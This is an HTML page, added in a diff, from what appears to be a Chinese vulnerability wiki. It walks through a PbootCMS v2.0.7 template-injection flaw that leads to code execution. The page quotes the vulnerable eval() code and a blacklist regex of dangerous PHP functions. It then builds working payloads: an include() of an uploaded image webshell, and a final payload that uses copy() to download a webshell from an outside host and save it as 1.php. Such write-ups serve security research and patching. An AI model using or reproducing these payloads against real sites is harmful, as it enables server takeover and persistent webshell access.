@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/PbootCMS/PbootCMS%20v2.0.7%20%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>PbootCMS v2.0.7 模板注入 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "PbootCMS v2.0.7 \u6a21\u677f\u6ce8\u5165", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_7" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../PbootCMS%20v2.0.7%20%E9%BB%98%E8%AE%A4%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8B%E8%BD%BD/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../PbootCMS%20v2.0.7%20%E9%BB%98%E8%AE%A4%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8B%E8%BD%BD/" class="btn btn-xs btn-link">
+        PbootCMS v2.0.7 默认数据库下载
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../PbootCMS%20v2.0.7%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../PbootCMS%20v2.0.7%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        PbootCMS v2.0.7 前台任意文件包含漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="pbootcms-v207">PbootCMS v2.0.7 模板注入<a class="headerlink" href="#pbootcms-v207" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>PbootCMS v2.0.7</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>文件：<code>apps/home/controller/ParserController.php</code></p>
+<p>精简后的代码如下：</p>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">parserIfLabel</span><span class="p">(</span><span class="nv">$content</span><span class="p">){</span>
+        <span class="nv">$pattern</span> <span class="o">=</span> <span class="s1">&#39;/\{pboot:if\(([^}^\$]+)\)\}([\s\S]*?)\{\/pboot:if\}/&#39;</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match_all</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span> <span class="nv">$content</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nv">$count</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+            <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$count</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$danger</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+
+                <span class="c1">// 带有函数的条件语句进行安全校验</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match_all</span><span class="p">(</span><span class="s1">&#39;/([\w]+)([\\\s]+)?\(/i&#39;</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$i</span><span class="p">],</span> <span class="nv">$matches2</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$matches2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="nv">$value</span><span class="p">)){</span>
+                            <span class="nv">$danger</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+                            <span class="k">break</span><span class="p">;</span>
+                        <span class="p">}</span>
+                    <span class="p">}</span>
+                <span class="p">}</span>
+
+                <span class="c1">// 过滤特殊字符串</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/(\$_GET\[)|(\$_POST\[)|(\$_REQUEST\[)|(\$_COOKIE\[)|(\$_SESSION\[)|(file_put_contents)|(fwrite)|(phpinfo)|(base64_decode)|(`)|(shell_exec)|(eval)|(system)|(exec)|(passthru)/i&#39;</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$i</span><span class="p">]))</span> <span class="p">{</span>
+                    <span class="nv">$danger</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+                <span class="p">}</span>
+
+                <span class="c1">// 如果有危险函数，则不解析该IF</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nv">$danger</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">continue</span><span class="p">;</span>
+                <span class="p">}</span>
+
+                <span class="k">eval</span><span class="p">(</span><span class="s1">&#39;if(&#39;</span> <span class="o">.</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$i</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;){$flag=&quot;if&quot;;}else{$flag=&quot;else&quot;;}&#39;</span><span class="p">);</span>
+                <span class="o">...</span>
+<span class="cp">?&gt;</span>
+</code></pre></div>
+
+<p>这里大概的意思就是，在模板的<code>if</code>语句中，通过正则找到函数的结构，然后将其传入<code>function_exists</code>，如果该函数存在则不执行下面的<code>eval()</code></p>
+<p>如果可以编辑模板文件，或者存在模板注入的话，那么就可以尝试绕一下这些限制，看能不能往<code>eval()</code>里面注入代码。</p>
+<p>在后台翻了一下，没有看到有对模板文件进行修改的地方，所以考虑模板注入。</p>
+<p>在后台的公司信息栏目插入符合模板<code>if</code>语句的</p>
+<h3 id="payload">Payload:<a class="headerlink" href="#payload" title="Permanent link">&para;</a></h3>
+<p><code>{pboot:if(1)}OK{/pboot:if}</code></p>
+<p><img alt="" src="../resource/PbootCMSv2.0.7%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/media/rId26.png" /></p>
+<p><img alt="" src="../resource/PbootCMSv2.0.7%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/media/rId27.png" /></p>
+<p>可以看到这里的模板语句已经解析了。所以这里是存在模板注入的。</p>
+<p>但是这个程序是有对所有参数进行全局的<code>htmlspecialchars</code>和<code>addslashes</code>的，在结合上面的正则，导致我们不能使用很多字符。</p>
+<p>有：<code>'"$}</code>和反引号、<code>\x00</code>等等。</p>
+<p>根据这个限制我很快有了一种思路：</p>
+<p>php的语法有一些具有函数结构，但是却不是函数的关键字。</p>
+<p>例如：<code>include()</code>、<code>array()</code>等。</p>
+<p>现在思路就很明确了，既然
+<code>include()</code>可以绕过函数检测这个点，那么往里面传参数就完事了。</p>
+<p>接下来就是要想办法在当前限制下构造出一个字符串往<code>include()</code>里面传了。</p>
+<ul>
+<li>思路1：</li>
+</ul>
+<p><div class="highlight"><pre><span></span><code>&lt;!-- --&gt;
+</code></pre></div>
+-   通过<code>$_SERVER</code>数组传，但是前面的正则ban了<code>$</code>，所以这个思路不行。</p>
+<p><div class="highlight"><pre><span></span><code>&lt;!-- --&gt;
+</code></pre></div>
+-   思路2：</p>
+<p><div class="highlight"><pre><span></span><code>&lt;!-- --&gt;
+</code></pre></div>
+-   使用<code>get_defined_vars()</code>从get的参数里面获取，但是<code>get_defined_vars</code>不能过<code>function_exists</code>，所以也不行。</p>
+<p><div class="highlight"><pre><span></span><code>&lt;!-- --&gt;
+</code></pre></div>
+-   思路3：</p>
+<p><div class="highlight"><pre><span></span><code>&lt;!-- --&gt;
+</code></pre></div>
+-   PHP7.2版本开始：不带引号的字符串是不存在的全局常量的话，那么则转化成他们自身的字符串。</p>
+<div class="codehilite"><pre><span></span><code>意思就是`echo a`=\&gt;`define(a, &#39;a&#39;);echo a;`
+</code></pre></div>
+
+<p><img alt="" src="../resource/PbootCMSv2.0.7%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/media/rId28.png" /></p>
+<p>那么就可以不使用引号，从而构造字符串了。</p>
+<p>所以我们可以在后台上传一个图片马，然后用<code>include()</code>去包含getshell了。</p>
+<p>但是这里有个问题，上传后的图片路径会有数字和<code>/</code>、<code>.</code>，而数字和<code>/</code>、<code>.</code>不带引号是不会触发上面说的trick的。</p>
+<p>也就是现在能构造任意字母了，但是还需要数字和<code>/</code>、<code>.</code></p>
+<p><code>/</code>和<code>.</code>其实很好办，PHP有几个预定义常量如<code>__FILE__</code>，获取当前的文件的绝对路径</p>
+<p>在程序里打印一下看看</p>
+<p><img alt="" src="../resource/PbootCMSv2.0.7%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/media/rId29.png" /></p>
+<p><code>.</code>和<code>/</code>都有，但是直接用数组的方式去取是会报错的。</p>
+<p>这时候就需要用到刚刚说的<code>array()</code>了，将<code>__FILE__</code>放进<code>array()</code>里之后再利用去二维数组的方式去取就不会报错了。<strong>（因为这里是将常量赋值进了数组里面，不是直接对常量进行数组的方式取值，所以不会报错。）</strong></p>
+<div class="codehilite"><pre><span></span><code><span class="n">var_dump</span><span class="p">(</span><span class="n">array</span><span class="p">(</span><span class="n">__FILE__</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="o">-</span><span class="mi">4</span><span class="p">]);</span><span class="w"> </span><span class="o">//=.</span>
+<span class="n">var_dump</span><span class="p">(</span><span class="n">array</span><span class="p">(</span><span class="n">__FILE__</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="o">-</span><span class="mi">21</span><span class="p">]);</span><span class="w"> </span><span class="o">//=/</span>
+</code></pre></div>
+
+<p><img alt="" src="../resource/PbootCMSv2.0.7%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/media/rId30.png" /></p>
+<p>现在就缺数字了，而且该数字还必须是String型的数字。</p>
+<p>PHP下还有带有数字的常量，例如<code>__LINE__</code>、<code>__PHP_VERSION__</code>，但是这些数字可能不太够，而且也不太能确定具体得值，不够\"一般化\"。</p>
+<p>于是开始寻找别的办法。</p>
+<p>于是我开始全局搜索<code>define(</code>，寻找在程序中定义的，可控或者含有数字的常量。</p>
+<p>文件：<code>core/view/Paging.php</code></p>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="o">...</span>
+  <span class="k">public</span> <span class="k">function</span> <span class="nf">limit</span><span class="p">(</span><span class="nv">$total</span> <span class="o">=</span> <span class="k">null</span><span class="p">,</span> <span class="nv">$morePageStr</span> <span class="o">=</span> <span class="k">false</span><span class="p">){</span>
+        <span class="c1">// 起始数据调整</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">start</span><span class="p">)</span> <span class="o">||</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">start</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">start</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">start</span> <span class="o">&gt;</span> <span class="nv">$total</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">start</span> <span class="o">=</span> <span class="nv">$total</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="c1">// 设置总数</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$total</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">rowTotal</span> <span class="o">=</span> <span class="nv">$total</span> <span class="o">-</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">start</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="c1">// 设置分页大小</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pageSize</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pageSize</span> <span class="o">=</span> <span class="nx">get</span><span class="p">(</span><span class="s1">&#39;pagesize&#39;</span><span class="p">)</span> <span class="o">?:</span> <span class="nx">Config</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;pagesize&#39;</span><span class="p">)</span> <span class="o">?:</span> <span class="mi">15</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="c1">// 分页数字条数量</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">num</span> <span class="o">=</span> <span class="nx">Config</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;pagenum&#39;</span><span class="p">)</span> <span class="o">?:</span> <span class="mi">5</span><span class="p">;</span>
+
+        <span class="c1">// 计算页数</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pageCount</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ceil</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">rowTotal</span> <span class="o">/</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pageSize</span><span class="p">);</span>
+
+        <span class="c1">// 获取当前页面</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">page</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">page</span><span class="p">();</span>
+
+        <span class="c1">// 定义相关常量，用于方便模板引擎解析序号等计算和调用</span>
+        <span class="nb">define</span><span class="p">(</span><span class="s1">&#39;ROWTOTAL&#39;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">rowTotal</span><span class="p">);</span>
+        <span class="nb">define</span><span class="p">(</span><span class="s1">&#39;PAGECOUNT&#39;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pageCount</span><span class="p">);</span>
+        <span class="nb">define</span><span class="p">(</span><span class="s1">&#39;PAGE&#39;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">page</span><span class="p">);</span>
+        <span class="nb">define</span><span class="p">(</span><span class="s1">&#39;PAGESIZE&#39;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pageSize</span><span class="p">);</span>
+
+        <span class="c1">// 注入分页模板变量</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">assign</span><span class="p">(</span><span class="nv">$morePageStr</span><span class="p">);</span>
+
+        <span class="c1">// 返回限制语句</span>
+        <span class="k">return</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">page</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pageSize</span> <span class="o">+</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">start</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;,</span><span class="si">$this-&gt;pageSize</span><span class="s2">&quot;</span><span class="p">;</span>
+    <span class="p">}</span> 
+  <span class="c1">// 当前页码容错处理</span>
+    <span class="k">private</span> <span class="k">function</span> <span class="nf">page</span><span class="p">(){</span>
+        <span class="nv">$page</span> <span class="o">=</span> <span class="nx">get</span><span class="p">(</span><span class="s1">&#39;page&#39;</span><span class="p">,</span> <span class="s1">&#39;int&#39;</span><span class="p">)</span> <span class="o">?:</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">page</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$page</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$page</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$page</span> <span class="o">&gt;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pageCount</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pageCount</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pageCount</span><span class="p">;</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="k">return</span> <span class="nv">$page</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="o">...</span>
+<span class="cp">?&gt;</span>
+</code></pre></div>
+
+<p>这里是该程序的一个分页类，可以看到里面有一个叫<code>PAGE</code>的常量，且该常量可控。</p>
+<p>那么就寻找调用了这个分页类的地方传入<code>page</code>就好。</p>
+<p>例如：<code>http://www.0-sec.org/?keyword=123&amp;page=0123456789</code></p>
+<p><img alt="" src="../resource/PbootCMSv2.0.7%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/media/rId31.png" /></p>
+<p>且该常量为string类型。</p>
+<p>至此，路径中需要的字符都构造出来了，只需要用<code>.</code>连接即可。</p>
+<h3 id="_5">漏洞复现<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<ol>
+<li>上传图片马</li>
+</ol>
+<p><img alt="" src="../resource/PbootCMSv2.0.7%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/media/rId33.png" /></p>
+<ol>
+<li>
+<p>得到路径<code>static/upload/image/20200417/1587111957160139.png</code></p>
+</li>
+<li>
+<p>根据路径构造payload</p>
+</li>
+<li>
+<p><code>include(s.tatic.array(__FILE__)[0][0].upload.array(__FILE__)[0][0].image.array(__FILE__)[0][0].array(PAGE)[0][2].array(PAGE)[0][0].array(PAGE)[0][2].array(PAGE)[0][0].array(PAGE)[0][0].array(PAGE)[0][4].array(PAGE)[0][1].array(PAGE)[0][7].(马赛克).png)</code></p>
+<p>将payload放入模板的<code>if</code>语句中</p>
+</li>
+<li>
+<p>模板注入</p>
+</li>
+</ol>
+<p><img alt="" src="../resource/PbootCMSv2.0.7%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/media/rId34.jpg" /></p>
+<ol>
+<li>访问带有分页类且又能输出公司地址的地方</li>
+</ol>
+<p><img alt="" src="../resource/PbootCMSv2.0.7%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/media/rId35.png" /></p>
+<p>Getshell成功！！！</p>
+<h3 id="_6">补充<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<p>一开始在研究这个漏洞的时候，就觉得有点麻烦，又要上传图片马，又要构造图片马的路径，不能一个payload直接打，十分麻烦。</p>
+<p>于是就跑去问了问P师傅**（P牛，永远滴神！）**</p>
+<p>P师傅理解了我的需求后，直接甩了个payload给我</p>
+<p><img alt="" src="../resource/PbootCMSv2.0.7%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/media/rId37.png" /></p>
+<p>看到后我才想起，以前就看过P师傅的一篇文章里面的一个trick：在一个函数的括号前面加入一些控制字符，PHP一样能识别改函数并执行。利用这个trick就可以执行任意函数了。</p>
+<p>于是根据P师傅给的思路再结合程序本身的一些其他的黑名单限制，很快我就构造出了一个通用的Payload</p>
+<div class="codehilite"><pre><span></span><code>{pboot%3aif(copy%01(chr%01(104).chr%01(116).chr%01(116).(马赛克),chr%01(49).chr%01(46).chr%01(112).chr%01(104).chr%01(112)))}asdasdasd{/pboot%3aif}
+</code></pre></div>
+
+<p>利用一个<code>copy()</code>函数到远程服务器上下载一个webshell放在本地，这里的webshell地址通过<code>chr()</code>函数一个个还原出shell地址一个个拼接。</p>
+<p>向模板注入该payload：</p>
+<p><img alt="" src="../resource/PbootCMSv2.0.7%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/media/rId38.jpg" /></p>
+<p>访问前台触发点：</p>
+<p><img alt="" src="../resource/PbootCMSv2.0.7%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/media/rId39.png" /></p>
+<p>则会去<code>http://mock.x.dnshia.cn/shell</code>下载webshell，并保存到<code>1.php</code></p>
+<p><img alt="" src="../resource/PbootCMSv2.0.7%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/media/rId40.png" /></p>
+<h2 id="_7">参考链接<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/7628">https://xz.aliyun.com/t/7628</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../PbootCMS%20v2.0.7%20%E9%BB%98%E8%AE%A4%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8B%E8%BD%BD/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../PbootCMS%20v2.0.7%20%E9%BB%98%E8%AE%A4%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8B%E8%BD%BD/" class="btn btn-xs btn-link">
+        PbootCMS v2.0.7 默认数据库下载
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../PbootCMS%20v2.0.7%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../PbootCMS%20v2.0.7%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        PbootCMS v2.0.7 前台任意文件包含漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
